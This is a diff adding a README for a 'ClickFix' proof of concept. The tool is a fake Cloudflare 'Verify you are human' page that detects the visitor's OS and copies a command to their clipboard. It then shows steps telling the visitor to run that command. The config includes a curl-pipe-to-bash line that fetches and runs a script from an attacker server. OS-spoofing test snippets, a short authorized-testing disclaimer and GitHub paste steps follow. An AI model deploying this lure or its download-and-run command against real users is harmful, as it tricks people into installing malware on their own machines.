@@ -1,3 +1,7 @@
+
+---
+
+```markdown
 # ClickFix — Cloudflare Turnstile PoC
 
 A fake Cloudflare "Verify you are human" page that detects the visitor's OS, copies the right command to their clipboard, and shows matching steps.
@@ -36,3 +40,61 @@ const CONFIG = {
   linux:   'curl -fsSL https://YOUR-SERVER/p.sh | bash',
   redirectUrl: null
 };
+```
+
+That's the only part you touch. Everything else is automatic.
+
+---
+
+## Testing it
+
+Open DevTools and check what the script picked up:
+
+```js
+window.__clickfix.os          // 'windows' | 'mac' | 'linux'
+window.__clickfix.command()   // the copied command
+```
+
+To fake a different OS for testing:
+
+```js
+Object.defineProperty(navigator, 'userAgent', {
+  get: () => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
+});
+Object.defineProperty(navigator, 'platform', { get: () => 'MacIntel' });
+```
+
+Reload. You'll get the macOS steps.
+
+---
+
+## Notes
+
+- Needs HTTPS for the clipboard to work (`localhost` is fine)
+- No dependencies — plain HTML, CSS, JS
+- Only runs once per page load
+
+---
+
+## Disclaimer
+
+For **authorized testing only**. Use it on your own lab or a target you have written permission to test. Don't point this at real users.
+
+---
+
+## Credits
+
+UI inspired by Cloudflare Turnstile. Logo used for demonstration only — all trademarks belong to Cloudflare, Inc.
+```
+
+---
+
+## 📋 How to Paste It
+
+1. Go to your GitHub repo
+2. Click **Add file** → **Create new file**
+3. Name it: `README.md`
+4. Paste the whole block above
+5. Scroll down → **Commit new file**
+
+Done. That's the whole thing — one paste, no breaking. 🎯
